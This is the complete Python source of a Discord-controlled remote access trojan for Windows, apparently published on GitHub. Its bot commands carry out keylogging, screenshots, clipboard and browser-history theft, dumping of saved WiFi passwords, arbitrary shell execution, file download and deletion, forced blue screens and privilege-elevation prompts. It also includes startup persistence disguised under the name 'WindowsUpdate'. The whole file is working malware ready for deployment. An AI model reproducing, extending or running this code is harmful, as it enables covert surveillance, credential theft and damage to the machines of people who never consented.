import asyncio
import discord
from discord.ext import commands
import pyautogui
import io
import socket
import subprocess
import pyperclip
import os
import time
import ctypes
import webbrowser
import keyboard
from threading import Thread, Event
import json
from datetime import datetime, timedelta
import sqlite3
import shutil
import sys
from os import getenv
import glob
import ssl
import certifi

key_log = []
log_active = False
active_channels = set()
stop_event = Event()
last_sent_time = time.time()
current_dir = os.getcwd()
TOKEN = ""  # Replace with your bot token, get it from https://discord.com/developers/applications

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")


def watermark():
    return "\n\n***||@1ypi - https://github.com/1ypi||***"  # please do not remove this watermark or I will be sad :(


def wait_for_internet(timeout=5):
    while True:
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return
        except OSError:
            time.sleep(timeout)


wait_for_internet()


@bot.command()
async def su(ctx):
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send(f"✅ Already running as administrator{watermark()}")
            return

        current_pid = os.getpid()

        batch_script = f"""
        @echo off
        timeout /t 3 /nobreak >nul
        taskkill /pid {current_pid} /f
        del "%~f0"
        """

        temp_bat = os.path.join(getenv("TEMP"), "elevate_kill.bat")
        with open(temp_bat, "w") as f:
            f.write(batch_script)

        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )

        subprocess.Popen(
            temp_bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        await ctx.send(
            f"🔄 Requesting administrator privileges... This window will close if accepted.{watermark()}"
        )

    except Exception as e:
        await ctx.send(f"❌ Failed to elevate privileges: {str(e)}{watermark()}")


@bot.command()
async def recent(ctx, browser: str = "chrome"):
    try:
        await ctx.send(f"🔍 Collecting recently visited websites...{watermark()}")
        browser = browser.lower()
        history = []

        if browser in ["chrome", "edge", "brave"]:
            browser_paths = {
                "chrome": os.path.join(
                    getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"
                ),
                "edge": os.path.join(
                    getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"
                ),
                "brave": os.path.join(
                    getenv("LOCALAPPDATA"),
                    "BraveSoftware",
                    "Brave-Browser",
                    "User Data",
                ),
            }

            path = browser_paths.get(browser)
            if not path or not os.path.exists(path):
                await ctx.send(
                    f"❌ {browser.capitalize()} not found or no history available.{watermark()}"
                )
                return

            history_files = []
            for root, dirs, files in os.walk(path):
                if "Extensions" in root:
                    continue
                if "History" in files:
                    history_files.append(os.path.join(root, "History"))

            if not history_files:
                await ctx.send(
                    f"❌ No history found for {browser.capitalize()}.{watermark()}"
                )
                return

            for history_file in history_files:
                try:
                    temp_db = os.path.join(getenv("TEMP"), "temp_history.db")
                    shutil.copy2(history_file, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    cursor.execute(
                        """
                        SELECT urls.url, urls.title, visits.visit_time 
                        FROM urls 
                        JOIN visits ON urls.id = visits.url 
                        ORDER BY visits.visit_time DESC 
                        LIMIT 100
                    """
                    )

                    for url, title, visit_time in cursor.fetchall():
                        timestamp = datetime(1601, 1, 1) + timedelta(
                            microseconds=visit_time
                        )
                        history.append(
                            {
                                "url": url,
                                "title": title if title else "[No Title]",
                                "time": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                                "browser": browser,
                            }
                        )

                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    print(f"Error reading history: {e}")
                    if "conn" in locals():
                        conn.close()
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                    continue

        elif browser == "firefox":
            firefox_path = os.path.join(
                getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"
            )
            if not os.path.exists(firefox_path):
                await ctx.send(
                    f"❌ Firefox not found or no history available.{watermark()}"
                )
                return

            history_files = glob.glob(
                os.path.join(firefox_path, "**", "places.sqlite"), recursive=True
            )

            if not history_files:
                await ctx.send(f"❌ No history found for Firefox.{watermark()}")
                return

            for history_file in history_files:
                try:
                    temp_db = os.path.join(getenv("TEMP"), "temp_places.sqlite")
                    shutil.copy2(history_file, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    cursor.execute(
                        """
                        SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date 
                        FROM moz_places 
                        JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id 
                        ORDER BY moz_historyvisits.visit_date DESC 
                        LIMIT 100
                    """
                    )

                    for url, title, visit_time in cursor.fetchall():
                        timestamp = datetime(1970, 1, 1) + datetime.timedelta(
                            microseconds=visit_time
                        )
                        history.append(
                            {
                                "url": url,
                                "title": title if title else "[No Title]",
                                "time": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                                "browser": "firefox",
                            }
                        )

                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    print(f"Error reading Firefox history: {e}")
                    if "conn" in locals():
                        conn.close()
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                    continue
        else:
            await ctx.send(
                f"❌ Unsupported browser. Try 'chrome', 'edge', 'brave', or 'firefox'.{watermark()}"
            )
            return

        if not history:
            await ctx.send(f"❌ No browsing history found.{watermark()}")
            return

        output = []
        for i, entry in enumerate(history[:50], 1):
            output.append(f"{i}. [{entry['time']}] {entry['title']}\n   {entry['url']}")

        message = (
            f"🌐 Recent browsing history from {browser.capitalize()}:\n"
            + "\n".join(output)
            + watermark()
        )
        if len(message) > 2000:
            for i in range(0, len(message), 2000):
                await ctx.send(message[i : i + 2000])
        else:
            await ctx.send(message)

    except Exception as e:
        await ctx.send(
            f"An error occurred while collecting browsing history: {e}{watermark()}"
        )


@bot.command()
async def screen(ctx):
    try:
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        img_bytes.seek(0)
        await ctx.send(file=discord.File(img_bytes, "screenshot.png"))
        await ctx.send(f"Screenshot captured{watermark()}")
    except Exception as e:
        await ctx.send(f"Error capturing screenshot: {e}{watermark()}")


@bot.command()
async def ip(ctx):
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        await ctx.send(f"IP address: {ip_address}{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting IP: {e}{watermark()}")


@bot.command()
async def clipboard(ctx):
    try:
        content = pyperclip.paste()
        if content:
            await ctx.send(f"**Current Clipboard:**\n{content[:2000]}{watermark()}")
        else:
            await ctx.send(f"Clipboard is empty or not text.{watermark()}")
    except Exception as e:
        await ctx.send(f"Error reading clipboard: {e}{watermark()}")


@bot.command()
async def exec(ctx, *, command: str):
    try:
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10
        )
        result = (
            result[:1900] + "\n...output truncated..." if len(result) > 1900 else result
        )
        await ctx.send(f"```\n{result}\n```{watermark()}")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Command failed:\n```\n{e.output}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error: {e}{watermark()}")


@bot.command()
async def shutdown(ctx):
    try:
        await ctx.send(f"Shutting down the PC...{watermark()}")
        os.system("shutdown /s /t 1")
    except Exception as e:
        await ctx.send(f"Error shutting down: {e}{watermark()}")


@bot.command()
async def bsod(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(
            3221226010, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint())
        )
        await ctx.send(f"Triggering BSOD...{watermark()}")
    except Exception as e:
        await ctx.send(f"Error triggering BSOD: {e}{watermark()}")


@bot.command()
async def url(ctx, *, url: str):
    try:
        url = "http://" + url if not url.startswith(("http://", "https://")) else url
        webbrowser.open(url)
        await ctx.send(f"🌐 Opened URL: {url}{watermark()}")
    except Exception as e:
        await ctx.send(f"Error opening URL: {e}{watermark()}")


@bot.command()
async def restart(ctx):
    try:
        await ctx.send(
            f"🔄 Restarting PC in 5 seconds... Type `!cancelrestart` to abort.{watermark()}"
        )
        time.sleep(5)
        if not stop_event.is_set():
            os.system("shutdown /r /t 1")
    except Exception as e:
        await ctx.send(f"Error restarting: {e}{watermark()}")


@bot.command()
async def cancelrestart(ctx):
    try:
        stop_event.set()
        await ctx.send(f"✅ Restart cancelled.{watermark()}")
    except Exception as e:
        await ctx.send(f"Error cancelling restart: {e}{watermark()}")


def on_key_event(e):
    if e.event_type == keyboard.KEY_DOWN and log_active:
        key_name = e.name
        key_name = f"[{key_name.upper()}]" if len(key_name) > 1 else key_name
        key_log.append(key_name)
    return None


async def send_periodic_updates():
    global last_sent_time, key_log
    while not stop_event.is_set():
        if log_active and active_channels:
            await asyncio.sleep(15)
            if key_log:
                keys_str = " ".join(key_log)
                if len(keys_str) > 1900:
                    keys_str = keys_str[:1900] + "... [truncated]"
                for channel_id in active_channels:
                    channel = bot.get_channel(channel_id)
                    if channel:
                        try:
                            await channel.send(
                                f"⌨️ Keys pressed (last 15s):\n```{keys_str}```{watermark()}"
                            )
                        except Exception as e:
                            print(f"Error sending keylog: {e}")
                key_log = []
            last_sent_time = time.time()
        else:
            await asyncio.sleep(5)


@bot.command()
async def log(ctx):
    global log_active
    if log_active:
        await ctx.send(f"⚠️ Keylogging is already active!{watermark()}")
    else:
        log_active = True
        active_channels.add(ctx.channel.id)
        keyboard.hook(on_key_event)
        await ctx.send(
            f"✅ Keylogging started! (Updates every 15 seconds){watermark()}"
        )


@bot.command()
async def stoplog(ctx):
    global log_active
    if not log_active:
        await ctx.send(f"⚠️ Keylogging isn't active!{watermark()}")
    else:
        log_active = False
        if ctx.channel.id in active_channels:
            active_channels.remove(ctx.channel.id)
        await ctx.send(f"⛔ Keylogging stopped!{watermark()}")


@bot.command()
async def msg(ctx, *, message: str):
    try:
        sanitized_msg = message.replace('"', '""')
        vbs_script = f'\n        MsgBox "{sanitized_msg}", vbExclamation, "Message from Discord"\n        '
        temp_vbs = os.path.join(getenv("TEMP"), "discord_msg.vbs")
        with open(temp_vbs, "w", encoding="utf-16") as f:
            f.write(vbs_script)
        subprocess.Popen(["wscript.exe", temp_vbs], shell=True)
        await ctx.send(
            f"✅ Message box displayed with text: {message[:100]}...{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error showing message box: {e}{watermark()}")


@bot.command()
async def help(ctx):
    help_embed = discord.Embed(
        title="Bot Commands Help",
        description=f"Here are all the available commands:{watermark()}",
        color=discord.Color.blue(),
    )
    commands_list = [
        ("!screen", "Capture and send a screenshot"),
        ("!ip", "Get the IP address"),
        ("!clipboard", "Show clipboard content"),
        ("!exec <command>", "Run a shell command"),
        ("!shutdown", "Shutdown the computer"),
        ("!bsod", "Trigger a BSOD (WARNING)"),
        ("!msg <message>", "Show a Windows message box"),
        ("!url <url>", "Open a URL in browser"),
        ("!restart", "Restart the computer"),
        ("!cancelrestart", "Cancel a scheduled restart"),
        ("!log", "Start keylogging (sends every 15s)"),
        ("!stoplog", "Stop keylogging"),
        ("!ls", "List files in the current directory"),
        ("!cd <path>", "Change the current directory"),
        ("!rm <filename>", "Delete a file"),
        ("!rmd <dirname>", "Delete a directory"),
        ("!download <filename>", "Download a file"),
        ("!uuid", "Get the system UUID"),
        ("!mac", "Get MAC addresses"),
        ("!dns", "Get DNS server info"),
        ("!wifi", "Show connected WiFi info"),
        ("!wifi_passwords", "Show saved WiFi passwords"),
        ("!systeminfo", "Show system information"),
        ("!cpu", "Show CPU information"),
        ("!gpu", "Show GPU information"),
        ("!ram", "Show RAM information in GB"),
        ("!drives", "Show drives information in GB"),
        ("!hostname", "Show the hostname"),
        ("!osinfo", "Show OS version"),
        ("!user", "Show current user"),
        ("!recent [browser]", "Show recently visited websites"),
        ("!su", "Request administrator privileges"),
    ]
    for i in range(0, len(commands_list), 25):
        embed = discord.Embed(
            title="Bot Commands Help" if i == 0 else None,
            description="Here are all the available commands:" if i == 0 else None,
            color=discord.Color.blue(),
        )
        for cmd, desc in commands_list[i : i + 25]:
            embed.add_field(name=cmd, value=desc, inline=False)
        await ctx.send(embed=embed)


current_dir = os.getcwd()


@bot.command()
async def ls(ctx):
    try:
        files = os.listdir(current_dir)
        output = "\n".join(files)
        if not output:
            output = "[Empty directory]"
        await ctx.send(
            f"**Directory listing for:** `{current_dir}`\n```\n{output[:1900]}\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error listing directory: {e}{watermark()}")


@bot.command()
async def cd(ctx, *, path: str):
    global current_dir
    try:
        new_path = os.path.abspath(os.path.join(current_dir, path))
        if os.path.isdir(new_path):
            current_dir = new_path
            await ctx.send(f"Changed directory to `{current_dir}`{watermark()}")
        else:
            await ctx.send(f"Directory not found: `{new_path}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error changing directory: {e}{watermark()}")


@bot.command()
async def rm(ctx, *, filename: str):
    try:
        target = os.path.join(current_dir, filename)
        if os.path.isfile(target):
            os.remove(target)
            await ctx.send(f"Deleted file `{filename}`{watermark()}")
        else:
            await ctx.send(f"File not found: `{filename}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error deleting file: {e}{watermark()}")


@bot.command()
async def rmd(ctx, *, dirname: str):
    try:
        target = os.path.join(current_dir, dirname)
        if os.path.isdir(target):
            shutil.rmtree(target)
            await ctx.send(f"Deleted directory `{dirname}`{watermark()}")
        else:
            await ctx.send(f"Directory not found: `{dirname}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error deleting directory: {e}{watermark()}")


@bot.command()
async def download(ctx, *, filename: str):
    try:
        target = os.path.join(current_dir, filename)
        if os.path.isfile(target):
            await ctx.send(file=discord.File(target))
            await ctx.send(f"File sent: `{filename}`{watermark()}")
        else:
            await ctx.send(f"File not found: `{filename}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error sending file: {e}{watermark()}")


@bot.command()
async def uuid(ctx):
    try:
        result = subprocess.check_output(
            "wmic csproduct get uuid", shell=True, text=True
        )
        await ctx.send(f"**UUID:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting UUID: {e}{watermark()}")


@bot.command()
async def mac(ctx):
    try:
        result = subprocess.check_output("getmac", shell=True, text=True)
        await ctx.send(f"**MAC Addresses:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting MAC address: {e}{watermark()}")


@bot.command()
async def dns(ctx):
    try:
        result = subprocess.check_output("ipconfig /all", shell=True, text=True)
        dns_lines = [
            line
            for line in result.splitlines()
            if "DNS Servers" in line or line.strip().startswith("DNS")
        ]
        dns_lines = ["No DNS info found."] if not dns_lines else dns_lines
        await ctx.send(
            "**DNS Info:**\n```\n" + "\n".join(dns_lines) + f"\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting DNS info: {e}{watermark()}")


@bot.command()
async def wifi(ctx):
    try:
        result = subprocess.check_output(
            "netsh wlan show interfaces", shell=True, text=True
        )
        await ctx.send(
            f"**Connected WiFi Info:**\n```\n{result.strip()}\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting WiFi info: {e}{watermark()}")


@bot.command()
async def wifi_passwords(ctx):
    try:
        profiles = subprocess.check_output(
            "netsh wlan show profiles", shell=True, text=True
        )
        profile_names = [
            line.split(":")[1].strip()
            for line in profiles.splitlines()
            if "All User Profile" in line
        ]

        passwords = []
        for name in profile_names:
            try:
                pw_info = subprocess.check_output(
                    f'netsh wlan show profile name="{name}" key=clear',
                    shell=True,
                    text=True,
                    stderr=subprocess.DEVNULL,
                )

                password = None
                for line in pw_info.splitlines():
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        break

                if password:
                    passwords.append(f"{name}: {password}")
                else:
                    passwords.append(f"{name}: <No password found>")

            except Exception as e:
                passwords.append(f"{name}: <Error retrieving password>")

        if passwords:
            output = (
                "**WiFi Passwords:**\n```\n"
                + "\n".join(passwords)
                + f"\n```{watermark()}"
            )
            if len(output) > 2000:
                parts = [output[i : i + 2000] for i in range(0, len(output), 2000)]
                for part in parts:
                    await ctx.send(part)
            else:
                await ctx.send(output)
        else:
            await ctx.send(f"No WiFi profiles found{watermark()}")
    except Exception as e:
        await ctx.send(f"❌ Error getting WiFi passwords: {str(e)}{watermark()}")


@bot.command()
async def systeminfo(ctx):
    try:
        result = subprocess.check_output("systeminfo", shell=True, text=True)
        await ctx.send(f"**System Info:**\n```\n{result[:1900]}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting system info: {e}{watermark()}")


@bot.command()
async def cpu(ctx):
    try:
        result = subprocess.check_output("wmic cpu get name", shell=True, text=True)
        await ctx.send(f"**CPU Info:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting CPU info: {e}{watermark()}")


@bot.command()
async def gpu(ctx):
    try:
        result = subprocess.check_output(
            "wmic path win32_VideoController get name", shell=True, text=True
        )
        await ctx.send(f"**GPU Info:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting GPU info: {e}{watermark()}")


@bot.command()
async def ram(ctx):
    try:
        result = subprocess.check_output(
            "wmic memorychip get capacity", shell=True, text=True
        )
        lines = result.strip().split("\n")[1:]
        total_bytes = sum(int(line.strip()) for line in lines if line.strip())
        total_gb = round(total_bytes / (1024**3), 2)

        result = subprocess.check_output(
            "wmic memorychip get speed,partnumber,manufacturer", shell=True, text=True
        )
        await ctx.send(
            f"**RAM Info:**\nTotal: {total_gb} GB\n```\n{result.strip()}\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting RAM info: {e}{watermark()}")


@bot.command()
async def drives(ctx):
    try:
        result = subprocess.check_output(
            "wmic logicaldisk get name,size,freespace,description",
            shell=True,
            text=True,
        )
        lines = result.strip().split("\n")

        output_lines = []
        headers = lines[0].split()
        output_lines.append(f"{'Drive':<6} {'Type':<15} {'Total':<10} {'Free':<10}")

        for line in lines[1:]:
            if not line.strip():
                continue
            parts = line.split()
            if len(parts) >= 4:
                drive = parts[0]
                desc = " ".join(parts[1:-2])
                size_bytes = int(parts[-2]) if parts[-2].isdigit() else 0
                free_bytes = int(parts[-1]) if parts[-1].isdigit() else 0

                size_gb = round(size_bytes / (1024**3), 2) if size_bytes else 0
                free_gb = round(free_bytes / (1024**3), 2) if free_bytes else 0

                output_lines.append(
                    f"{drive:<6} {desc:<15} {size_gb:>5} GB {free_gb:>5} GB"
                )

        await ctx.send(
            f"**Drives Info:**\n```\n" + "\n".join(output_lines) + f"\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting drives info: {e}{watermark()}")


@bot.command()
async def hostname(ctx):
    try:
        result = socket.gethostname()
        await ctx.send(f"**Hostname:** `{result}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting hostname: {e}{watermark()}")


@bot.command()
async def osinfo(ctx):
    try:
        result = subprocess.check_output("ver", shell=True, text=True)
        await ctx.send(f"**OS Version:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting OS info: {e}{watermark()}")


@bot.command()
async def user(ctx):
    try:
        result = os.getlogin()
        await ctx.send(f"**Current User:** `{result}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting current user: {e}{watermark()}")


@bot.event
async def on_ready():

    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    for channel in bot.get_all_channels():
        if isinstance(channel, discord.TextChannel):
            try:
                await channel.send(
                    f"@everyone\n"
                    f"✅ **Connected - !help for command info.**\n"
                    f"• Hostname: `{hostname}`\n"
                    f"• IP: `{ip_address}`\n"
                    f"• Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                    f"{watermark()}"
                )
                break
            except:
                continue

    print(f"Logged in as {bot.user.name}")
    bot.loop.create_task(send_periodic_updates())


def add_to_startup():
    try:
        startup_dir = os.path.join(
            os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        )

        exe_path = os.path.abspath(sys.argv[0])

        if exe_path.endswith(".py") or exe_path.endswith(".pyw"):

            target_path = os.path.join(startup_dir, "WindowsUpdate.lnk")

            shortcut_script = f"""
            Set oWS = WScript.CreateObject("WScript.Shell")
            Set oLink = oWS.CreateShortcut("{target_path}")
            oLink.TargetPath = "{sys.executable}"
            oLink.Arguments = "{exe_path}"
            oLink.WorkingDirectory = "{os.path.dirname(exe_path)}"
            oLink.Save
            """

            temp_vbs = os.path.join(getenv("TEMP"), "create_shortcut.vbs")
            with open(temp_vbs, "w") as f:
                f.write(shortcut_script)
            subprocess.run(
                ["wscript.exe", temp_vbs], creationflags=subprocess.CREATE_NO_WINDOW
            )
            os.remove(temp_vbs)

        else:

            target_path = os.path.join(startup_dir, "WindowsUpdate.exe")
            if not os.path.exists(target_path):
                shutil.copy2(exe_path, target_path)

    except Exception as e:
        print(f"Error adding to startup: {e}")


ssl_context = ssl.create_default_context()
ssl_context.load_verify_locations(certifi.where())

bot.run(TOKEN, ssl=ssl_context)
